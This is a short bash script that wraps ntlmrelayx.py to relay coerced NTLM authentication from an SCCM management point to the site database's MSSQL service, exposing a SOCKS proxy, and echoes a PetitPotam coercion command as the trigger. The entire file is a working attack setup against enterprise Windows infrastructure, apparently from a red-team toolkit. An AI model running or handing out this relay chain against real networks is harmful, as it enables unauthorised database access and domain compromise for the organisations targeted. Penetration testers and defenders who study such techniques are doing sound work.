#!/bin/bash
# SCCM NTLM Relay Setup
# Usage: ./setup-relay.sh <SiteDB-IP> [SOCKS-PORT]
# Starts ntlmrelayx.py listener for SMB→TDS relay

if [ -z "$1" ]; then
    echo "Usage: $0 <SiteDB-IP> [SOCKS-PORT]"
    echo "Example: $0 10.10.10.15 1080"
    exit 1
fi

SITE_DB_IP="$1"
SOCKS_PORT="${2:-1080}"

echo "[*] Starting NTLM relay listener..."
echo "[*] Target: mssql://${SITE_DB_IP}"
echo "[*] SOCKS proxy: localhost:${SOCKS_PORT}"
echo ""
echo "[!] Run this in the background, then trigger coercion from MP"
echo "[!] Example coercion (PetitPotam):"
echo "    python3 PetitPotam.py <MP-IP> <Attacker-IP> -u <user> -p <pass> -d <DOMAIN> -dc-ip <DC-IP>"
echo ""

# Start ntlmrelayx
ntlmrelayx.py -ts -t "mssql://${SITE_DB_IP}" -socks -smb2support -socks-port "${SOCKS_PORT}"
